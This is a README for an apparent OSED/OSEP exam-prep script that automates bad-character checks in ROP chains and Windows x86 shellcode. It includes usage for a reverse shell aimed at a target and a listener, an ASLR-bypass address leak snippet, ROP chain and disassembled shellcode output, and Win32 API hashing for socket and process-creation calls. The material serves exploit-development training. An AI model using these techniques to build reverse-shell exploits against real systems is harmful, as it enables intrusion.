# OSEP_OSED_TOOLS

## OSED_exploit.py

### Overview

This script combines [ommadawn46's win-x86-shellcoder](https://github.com/ommadawn46/win-x86-shellcoder) and the RopChain class from [@Tan90909090's OSED blog post](https://tan.hatenadiary.jp/entry/2023/10/30/020524) to automate the process of checking bad characters in ROP gadgets and shellcode.

## Prerequisites

This script uses Python3 ,[Keystone-Engine](https://pypi.org/project/keystone-engine/) and [Capstone](https://pypi.org/project/capstone/) (tested with capstone-5.0.1-py3-none-win32.whl ) to assemble and  disassemble Shellcode respectively.

## Usage
```sh
./exploit_script.py -t <target_ip> -li <listener_ip> -lp <listener_port> [-d]
```

- `-t, --target`: Specifies the target IP address or hostname.
- `-li, --ipaddress`: IP address where your listener is running (for reverse shell payloads).
- `-lp, --port`: Listening port on which your listener is running.
- `-d, --debug`: Inserts an `int3` instruction in the shellcode for debugging purposes.

If the exploit requires you to leak base addresses to Bypass ASLR, uncomment:
```python
function_addr = leak_BaseAddr()
baseAddr = parseAddr(function_addr) - 0x1e70
def C(rop_address):
     " Converts preferred address of rop address to ASLR randomized address based on dllBase"
     return (baseAddr + (rop_address  - prefaddr))  
```

Your RopChain should look something like this:
```python
ropchain = RopChain(bad_chars)
		
# ROPCHAIN
ropchain.append(C(0x10154112))			# push esp ; inc ecx ; adc eax, 
...
```

When you run the exploit, the script will alert you when bad characters are present in your shellcode/ropchain.

```sh
python OSED_exploit.py -t 127.0.0.1 -li 127.0.0.1 -lp 4444 
...
[ ] 50                           : push eax
[x] 687f000001 : push 0x100007f
[ ] 66b8115c                     : mov ax, 0x5c11
[ ] c1e010                       : shl eax, 0x10
...
```

Remember to update `badchars`!
```
bad_chars = b"\x00"
```

If you're writing Shellcode that uses different Win32 APIs, make sure to change the loaded modules so the hash keys generated don't have bad characters.
```python
hash_key = find_hash_key(
	[
	("KERNEL32.DLL", "LoadLibraryA"),
	("WS2_32.DLL", "WSAStartup"),
	("WS2_32.DLL", "WSASocketA"),
	("WS2_32.DLL", "WSAConnect"),
	("KERNEL32.DLL", "CreateProcessA"),
	("KERNEL32.DLL", "TerminateProcess")
	], bad_chars
)
```

## Disclaimer